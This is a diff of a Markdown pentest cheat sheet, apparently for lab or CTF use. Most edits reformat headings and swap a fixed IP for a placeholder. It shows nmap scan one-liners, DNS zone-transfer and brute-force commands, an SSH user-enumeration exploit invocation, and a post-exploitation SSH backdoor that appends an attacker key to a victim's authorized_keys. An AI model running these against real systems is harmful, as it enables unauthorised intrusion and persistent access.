@@ -13,9 +13,7 @@
   - [Enumeration](#enumeration)
   - [FTP - 21](#ftp---21)
   - [SSH - 22](#ssh---22)
-    - [SSH backdoor - post exploitation](#ssh-backdoor---post-exploitation)
   - [DNS - 53](#dns---53)
-    - [DNS brute force](#dns-brute-force)
   - [FINGER - 79](#finger---79)
   - [HTTP - HTTPS - 80 - 443](#http---https---80---443)
   - [KERBEROS - 88](#kerberos---88)
@@ -125,7 +123,7 @@
   - Vulners  (Website only)
     - `sudo nmap -sV -v --script=vulners`
 
-- Saved Scans
+- Saved Scans (IPs Known)
   - Quick Scan
     - `sudo nmap -T4 -A -v -oN NMAP-MQS_<IP>_01.txt <IP>`
   - Full Scan
@@ -135,9 +133,9 @@
   - UDP Scan
     - `sudo nmap -T3 -sU -A -p- -v -oN NMAP-MFS_<IP>_01.txt <IP>`
 
-- Faster NMAP full port scan
+- Faster NMAP full port scan (IPs Known)
   - Finds all open ports than loops through service and version detection for those discovered
-    - `ports=$(nmap -p- --min-rate=1000 -sT  -T4 10.10.10.116 | grep ^[0-9] | cut-d '/' -f 1 | tr '\n' ',' | sed s/,$//)nmap -sC -sV -p$ports -sT 10.10.10.116`
+    - `ports=$(nmap -p- --min-rate=1000 -sT  -T4 <IP> | grep ^[0-9] | cut-d '/' -f 1 | tr '\n' ',' | sed s/,$//)nmap -sC -sV -p$ports -sT <IP>`
 
 ## FTP - 21
 - Brute force
@@ -172,17 +170,17 @@
   - `python 5720 rsa/2048 <IP> <USER> <PORT> <THREADS>`
   - `python 5720 dsa/1024 <IP> <USER> <PORT> <THREADS>`
 
-### SSH backdoor - post exploitation
-- Attacker
-  - `ssh-keygen -f <FILENAME>`
-  - `chmod 600 <FILENAME>`
-  - `cat <FILENAME>.pub -> copy`
+- SSH backdoor - post exploitation
+  - Attacker
+    - `ssh-keygen -f <FILENAME>`
+    - `chmod 600 <FILENAME>`
+    - `cat <FILENAME>.pub -> copy`
 
-- Victim
-  - `echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys`
+  - Victim
+    - `echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys`
 
-- Connect
-  - `ssh -i <FILENAME> <USER>@<IP>`
+  - Connect
+    - `ssh -i <FILENAME> <USER>@<IP>`
 
 ## DNS - 53
   - `dnsenum <DOMAIN>`
@@ -192,8 +190,8 @@
   - `dnsrecon -d <DOMAIN> -a`
   - `dig axfr <DOMAIN> @ns1.test.com`
 
-### DNS brute force
-- <https://github.com/blark/aiodnsbrute>
+- DNS brute force
+  - <https://github.com/blark/aiodnsbrute>
 
 ## FINGER - 79
 - User enumeration
